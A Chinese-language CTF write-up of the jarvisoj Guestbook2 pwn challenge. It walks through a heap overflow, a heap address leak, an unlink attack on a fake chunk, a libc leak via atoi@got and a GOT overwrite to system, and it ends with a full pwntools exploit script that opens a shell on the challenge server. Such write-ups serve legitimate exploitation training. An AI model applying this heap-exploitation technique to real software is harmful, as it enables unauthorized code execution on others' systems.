---
layout:     post
title:      jarvisoj Guestbook2
author:     wooy0ung
tags: 		pwn
category:  	writeup
---


>Problem Address:  
>https://www.jarvisoj.com  
>  
>Problem Description:  
>听说guestbook1很快被人日穿了，出题人表示不服，于是对Guestbook进行了升级，自以为写的很科学~~大家一起鉴定一下。  
>  
>Download:  
>https://dn.jarvisoj.com/challengefiles/guestbook2.rar.f90369a6de48cbfe84ea32b232ad9630  
>  
>Address:  
>nc pwn.jarvisoj.com 9879  
<!-- more -->


### 0x00 分析

一个简单的留言板工具，是比较典型的堆溢出题

![](/assets/img/writeup/pwn/2017-07-31-jarvisoj-guestbook2/0x00.png)

最初malloc一个大的chunk，用来记录所有note的信息

![](/assets/img/writeup/pwn/2017-07-31-jarvisoj-guestbook2/0x01.png)

这个chunk的大致结构

```
pre_size       -16       存放pre_size
size           -8        存放size
---------------------------------------------------------------
内容           地址       作用分析
---------------------------------------------------------------
256             0    	最大note数量
0               8    	当前note数量
0              16    	1 (此处是否有note)
0              24    	note的长度
0              32    	str (需要劫持的指针,完成内存leak和got覆写)
```

检查delete方法

![](/assets/img/writeup/pwn/2017-07-31-jarvisoj-guestbook2/0x02.png)

检查edit方法

![](/assets/img/writeup/pwn/2017-07-31-jarvisoj-guestbook2/0x03.png)


### 0x01 leak heap_base

先创建4个chunk，大小自动对齐到0x80，free掉chunk0、chunk2，加入bin双向链表

![](/assets/img/writeup/pwn/2017-07-31-jarvisoj-guestbook2/0x04.png)

现在chunk0->bk指向chunk2，覆盖掉chunk0的fd指针，用list方法打印出chunk0的bk指针

```
for i in range(4):
	add_post('a')

del_post(0)
del_post(2)

add_post('12345678')

leak_data = getpost(0)[8:]
heap_addr = u64((leak_data.ljust(8, "\x00"))[:8])
heap_base = heap_addr - 0x1940  # 0x1810 + (0x10+0x80) * 2 + 0x10 = 0x1940 
chunk_addr = heap_base + 0x30
```

注意chunk_addr中的0x30是大chunk的str指针相对于起始地址的偏移, str是内存中指向chunk0的指针


### 0x02 unlink & double free

```
FD = P->fd;
BK = P->bk;
FD->bk = BK;
BK->fd = FD;
```

构造fake chunk通过 FD->bk = BK->fd = P 检验，free(3)触发unlink，fake chunk向后合并

```
size0 = 0x80+0x90+0x90
add_post(p64(0)+p64(size0+1)+p64(chunk_addr-0x18)+p64(chunk_addr-0x10))
add_post("/bin/sh\x00") # chunk1
add_post("a"*0x80+p64(size0)+p64(0x90)+"a"*0x80+(p64(0)+p64(0x91)+"a"*0x80)*2)
del_post(3)
```

由于BK->fd = FD(*str = &str - 0x18), 最后 chunk0 指向 &str - 0x18，也即指向大chunk中的cur_num


### 0x03 leak system_addr

edit chunk0 覆盖大chunk的cur_num、note_exist、note_len、str(覆盖成atoi@got)

```
edit_post(0, p64(100)+p64(1)+p64(8)+p64(atoi_got))
leak_data = get_post('0. ')
atoi_addr = u64(leak_data[:-1].ljust(0x8,'\x00'))
system_addr = atoi_addr - libc.symbols['atoi'] + libc.symbols['system']
success("atoi: "+hex(atoi_addr))
success("system: "+hex(system_addr))
```

leak出atoi_addr，计算得到system_addr，写入system_addr

```
edit_post(0, p64(system_addr))
Io.sendline("$0")
Io.interactive()
```


### 0x04 完整的exploit

```
#!/usr/bin/python
# -*- coding:utf8 -*-

from pwn import *

Io = remote('pwn.jarvisoj.com', 9879)
#Io = process('./guestbook2')
bin = ELF('./guestbook2')
libc = ELF('./libc.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def add_post(content):
	Io.sendline('2')
	Io.recvuntil('Length')
	Io.sendline(str(len(content)))
	Io.recvuntil('Enter')
	Io.send(content)
def edit_post(idx,content):
	Io.sendline('3')
	Io.recvuntil('number')
	Io.sendline(str(idx))
	Io.recvuntil('Length')
	Io.sendline(str(len(content)))
	Io.recvuntil('Enter')
	Io.send(content)
def del_post(idx):
	Io.sendline('4')
	Io.recvuntil('number')
	Io.sendline(str(idx))
def get_post(content):
  	Io.recvuntil('Your choice: ')
  	Io.sendline('1')
  	Io.recvuntil(content)
  	return Io.recvuntil('\n')

#-----------------init-------------------
for i in range(4):
	add_post('a')

del_post(0)
del_post(2)

add_post('12345678')

#--------------leak heap_base-------------
leak_data = get_post('12345678')
heap_addr = u64(leak_data[:-1].ljust(0x8,'\x00'))
heap_base = heap_addr - 0x1940
chunk_addr = heap_base + 0x30
success("heap_base: "+hex(heap_base))

del_post(0)
del_post(1)
del_post(3)

#-----------------unlink------------------
size0 = 0x80+0x90+0x90
add_post(p64(0)+p64(size0+1)+p64(chunk_addr-0x18)+p64(chunk_addr-0x10))
add_post("/bin/sh\x00")
add_post("a"*0x80+p64(size0)+p64(0x90)+"a"*0x80+(p64(0)+p64(0x91)+"a"*0x80)*2)
del_post(3)

#------------leak system_addr-------------
atoi_got = bin.got['atoi']


edit_post(0, p64(100)+p64(1)+p64(8)+p64(atoi_got))
leak_data = get_post('0. ')
atoi_addr = u64(leak_data[:-1].ljust(0x8,'\x00'))
system_addr = atoi_addr - libc.symbols['atoi'] + libc.symbols['system']
success("atoi: "+hex(atoi_addr))
success("system: "+hex(system_addr))

#-------------------pwn--------------------
edit_post(0, p64(system_addr))
Io.sendline("$0")
Io.interactive()
```

getshell

![](/assets/img/writeup/pwn/2017-07-31-jarvisoj-guestbook2/0x05.png)